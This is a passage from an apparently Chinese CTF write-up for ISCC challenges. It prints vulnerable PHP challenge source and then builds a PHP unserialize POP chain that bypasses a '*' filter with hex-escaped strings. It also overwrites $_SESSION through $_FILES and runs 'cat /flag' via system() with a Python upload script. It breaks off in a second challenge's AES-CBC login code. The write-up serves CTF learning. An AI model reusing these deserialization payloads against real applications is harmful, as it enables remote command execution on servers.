&#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randstr</span>(<span class="hljs-params"><span class="hljs-variable">$len</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$characters</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;</span>;<br>    <span class="hljs-variable">$randstring</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$randstring</span> .= <span class="hljs-variable">$characters</span>[rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$characters</span>))];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$randstring</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$s</span>, <span class="hljs-string">&quot;*&quot;</span>) !== <span class="hljs-literal">FALSE</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">finalize</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>    @unlink(<span class="hljs-variable">$iscc_file</span>);<br>    <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;finish&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;whichisthetrueiscc.gif&#x27;&gt;&lt;br&gt;&quot;</span>;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whatareyounongshane&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$whatareyounongshane</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whatareyounongshane&#x27;</span>];<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$whatareyounongshane</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;src&quot;</span>:<br>            highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;cmd&quot;</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想越级干好事？还是有门的……&quot;</span>;<br>            header(<span class="hljs-string">&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;reset&quot;</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;几辈子积累的好运就在这时~:p&quot;</span>;<br>            header(<span class="hljs-string">&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;upload&quot;</span>:<br>            <span class="hljs-variable">$resp</span> = &lt;&lt;&lt;EOF<br>&lt;form action=<span class="hljs-string">&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>  &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;iscc_file&quot;</span>&gt;<br>  &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Upload Image&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;/form&gt;<br>EOF;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$resp</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;tellmetruth&quot;</span>:<br>            <span class="hljs-keyword">echo</span> base64_decode(<span class="hljs-string">&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;</span>);<br>            header(<span class="hljs-string">&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;空空如也就是我！&quot;</span>;<br>    &#125;<br>    finalize();<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;?&#x27;</span>])) &#123;<br><br>    <span class="hljs-variable">$wtf</span> = waf(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;?&#x27;</span>&#125;) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;?&#x27;</span>] : (finalize() &amp;&amp; <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;试试就“逝世”!&quot;</span>));<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$goodshit</span> = @unserialize(<span class="hljs-variable">$wtf</span>)) &#123;<br>        <span class="hljs-variable">$is_unser_finished</span> = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$status</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;new&#x27;</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;upload_ok&#x27;</span>, <span class="hljs-string">&#x27;upload_fail&#x27;</span>, <span class="hljs-string">&#x27;reset&#x27;</span>), <span class="hljs-literal">true</span>))<br>        finalize();<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>ISCC_Command类里面的__destruct方法可以执行cmd命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_unser_finished</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;cmd&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$is_unser_finished</span> === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看看你干的 [&lt;span style=&#x27;color:red&#x27;&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/span&gt;] 弄出了什么后果: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;<br>            @system(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/span&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>在ISCC_ResetCMD类里面对cmd进行重新赋值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_ResetCMD</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$new_cmd</span> = <span class="hljs-string">&quot;echo &#x27;新新世界，发号施令!&#x27;&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;reset&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] === <span class="hljs-string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-keyword">$this</span>-&gt;new_cmd;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里的__destruct方法必须得满足这个才能重置命令,即需要名为isccIsCciScc1scc的SESSION</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] === <span class="hljs-string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-keyword">$this</span>-&gt;new_cmd;<br>        &#125;<br></code></pre></td></tr></table></figure><p>通过变量覆盖来控制$_SESSION的值</p><p>ISCC__Upload类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Upload</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-variable">$is_upload</span> = (count(<span class="hljs-variable">$_FILES</span>) &gt; <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$iscc_file</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;upload_fail&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$is_upload</span>) &#123;<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>                <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>;<br></code></pre></td></tr></table></figure><p>其中<code>$GLOBALS[&#39;key&#39;] = value;</code>为全局变量的覆盖，当<code>$is_upload为true</code>的时候，就会触发这个循环，可以实现<code>$_SESSION</code>的变量覆盖。</p><p>而在upload类里面的__wakeup方法里面<code>$is_upload = (count($_FILES) &gt; 0);</code>会把他设置成true，其他的类都设置成了false。</p><p>这里了解一下<code>$_FILES</code>，<code>$_FILES</code>通过 HTTP POST 方式上传到当前脚本的项目的数组。<br>数组内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]  　　　  <span class="hljs-comment">#客户端机器文件的原名称。</span><br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]　　　　  <span class="hljs-comment">#文件的 MIME 类型，如果浏览器提供此信息的话。一个例子是“image/gif”。不过此 MIME 类型在 PHP 端并不检查，因此不要想当然认为有这个值。</span><br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>]　　　　  <span class="hljs-comment">#已上传文件的大小，单位为字节。</span><br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]    <span class="hljs-comment">#文件被上传后在服务端储存的临时文件名。</span><br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]       <span class="hljs-comment">#和该文件上传相关的错误代码。此项目是在 PHP 4.2.0 版本中增加的。</span><br></code></pre></td></tr></table></figure><p>所以我们就要让upload执行__destruct的时候，is_upload是true<br>这就要求，最早执行__destruct，最晚执行__wakeup，所以就可以按一定顺序来构造POP链</p><p>由于有一个waf函数，不能出现<code>*</code>号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$s</span>, <span class="hljs-string">&quot;*&quot;</span>) !== <span class="hljs-literal">FALSE</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是ISCC_ResetCMD类的<code>$new_cmd</code>的属性是protected的，序列化后会带有<code>*</code>，这就需要ISCC_Upload类的__wakeup在这些类的最后进行，但是__destruct要在第一个开始。需要按一定顺序来构造POP链::</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Command</span> </span>&#123;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_ResetCMD</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$new_cmd</span> = <span class="hljs-string">&quot;cat /flag&quot;</span>;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Upload</span> </span>&#123;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-keyword">new</span> ISCC_Upload(),<br>    <span class="hljs-string">&#x27;b&#x27;</span>=&gt;<span class="hljs-keyword">new</span> ISCC_ResetCMD(),<br>    <span class="hljs-string">&#x27;c&#x27;</span>=&gt;<span class="hljs-keyword">new</span> ISCC_Command(),<br>);<br><span class="hljs-variable">$b</span>=serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210527200514790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>利用16进制绕过,将s替换成S，在序列化内容中使用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制进行表示。使用url编码一下，然后替换s即可。</p><p>重新构造POP链:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>class ISCC_Command &#123;<br><br>&#125;<br>class ISCC_ResetCMD &#123;<br><br>    protected $new_cmd = <span class="hljs-string">&quot;cat /flag&quot;</span>;<br><br>&#125;<br>class ISCC_Upload &#123;<br>&#125;<br>$a=array(<br>    &#x27;a&#x27;=&gt;new ISCC_Upload(),<br>    &#x27;b&#x27;=&gt;new ISCC_ResetCMD(),<br>    &#x27;c&#x27;=&gt;new ISCC_Command(),<br>);<br>$b=urlencode(serialize($a));<br>$b=str_replace(<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;S&quot;</span>,$b);<br>$b=str_replace(<span class="hljs-string">&quot;%2A&quot;</span>,<span class="hljs-string">&#x27;\2a&#x27;</span>,$b);<br>echo $b;<br></code></pre></td></tr></table></figure><p>运行得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>BS%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ISCC_Upload%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>DS%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>b%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ISCC_ReSetCMD%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>BS%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>\<span class="hljs-number">2</span>a%<span class="hljs-number">00</span>new_cmd%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BS%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cat+%<span class="hljs-number">2</span>Fflag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>DS%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>c%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ISCC_Command%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>通过python脚本上传，注意图片不能太大</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://39.96.91.106:7050/&quot;</span><br><br>files=&#123;<br>    <span class="hljs-string">&#x27;iscc_file&#x27;</span>:(<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;atkx.jpg&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)),<br>    <span class="hljs-string">&quot;_SESSION&quot;</span>:(<span class="hljs-string">&quot;isccIsCciScc1scc&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>)<br>&#125;<br>headers=&#123;<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&quot;XDEBUG_SESSION=PHPSTORM&quot;</span><br>&#125;<br>r=requests.post(url=url+<span class="hljs-string">&quot;??=O%3A11%3A%22ISCC_Upload%22%3A1%3A%7BS%3A1%3A%22a%22%3BO%3A13%3A%22ISCC_ReSetCMD%22%3A2%3A%7BS%3A10%3A%22%00%5C2a%00new_cmd%22%3BS%3A9%3A%22cat+%2Fflag%22%3BS%3A1%3A%22b%22%3BO%3A12%3A%22ISCC_Command%22%3A0%3A%7B%7D%7D%7D&quot;</span>,files=files,headers=headers)<br><br>print(r.text)<br></code></pre></td></tr></table></figure><p>得到flag<br><img src="https://img-blog.csdnimg.cn/20210505151511508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="ISCC客服一号冲冲冲（二）"><a href="#ISCC客服一号冲冲冲（二）" class="headerlink" title="ISCC客服一号冲冲冲（二）"></a>ISCC客服一号冲冲冲（二）</h2><blockquote><p>经过激烈的竞争，客服一号终于通过自己的努力（选手的帮助），保住了自己的饭碗（获得了客服的密码），可当他打开客服登录窗口，却发现怎么也登不上去了。<br>你能帮他看看怎么回事吗？ 题目入口：<a href="http://39.96.91.106:8210/">http://39.96.91.106:8210/</a> Flag格式：iscc{XXX}</p></blockquote><p>查看源码，看到login.bmp，下载</p><p>蓝色通道最低位有异常，另存为login.html<br><img src="https://img-blog.csdnimg.cn/20210511231815173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>define(<span class="hljs-string">&quot;SECRET_KEY&quot;</span>, <span class="hljs-string">&#x27;101010031231243214&#x27;</span>);<br>define(<span class="hljs-string">&quot;METHOD&quot;</span>, <span class="hljs-string">&quot;aes-128-cbc&quot;</span>);<br>session_start();<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_random_iv</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$random_iv</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>;<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$random_iv</span>.=chr(rand(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>));<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$random_iv</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span>&#123;<br>    <span class="hljs-variable">$iv</span> = get_random_iv();<br>    <span class="hljs-variable">$plain</span> = serialize(<span class="hljs-variable">$info</span>);<br>    <span class="hljs-variable">$cipher</span> = openssl_encrypt(<span class="hljs-variable">$plain</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>);<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    setcookie(<span class="hljs-string">&quot;iv&quot;</span>, base64_encode(<span class="hljs-variable">$iv</span>));<br>    setcookie(<span class="hljs-string">&quot;cipher&quot;</span>, base64_encode(<span class="hljs-variable">$cipher</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_login</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cipher&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;iv&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$cipher</span> = base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cipher&#x27;</span>]);<br>        <span class="hljs-variable">$iv</span> = base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;iv&quot;</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$plain</span> = openssl_decrypt(<span class="hljs-variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>))&#123;<br>            <span class="hljs-variable">$info</span> = unserialize(<span class="hljs-variable">$plain</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;base64_decode(&#x27;&quot;</span>.base64_encode(<span class="hljs-variable">$plain</span>).<span class="hljs-string">&quot;&#x27;) can&#x27;t unserialize&lt;/p&gt;&quot;</span>);<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$info</span>[<span 